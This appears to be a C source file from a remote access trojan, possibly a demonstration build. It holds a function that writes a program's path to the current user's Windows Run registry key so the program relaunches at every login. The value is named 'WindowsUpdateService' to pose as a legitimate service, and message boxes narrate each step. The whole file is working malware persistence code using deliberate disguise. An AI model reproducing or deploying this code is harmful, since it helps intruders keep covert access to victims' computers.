#include "pers.h"

BOOL SetPersReg(const WCHAR* appPath) {
	HKEY hKey;
	MessageBox(NULL, L"RAT writes to Registry Key to gain persistence, with disguised key name: WindowsUpdateService", L"Flow", MB_OK);
	if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
		return FALSE;
	}
	// Set a disguised key name (masquerading as a legitimate service)
	const WCHAR* fakeKeyName = L"WindowsUpdateService";
	if (RegSetValueExW(hKey, fakeKeyName, 0, REG_SZ, (BYTE*)appPath, (wcslen(appPath) + 1) * sizeof(WCHAR)) != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return FALSE;
	}
	MessageBox(NULL, L"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateService", L"Flow", MB_OK);

	RegCloseKey(hKey);
	return TRUE;
}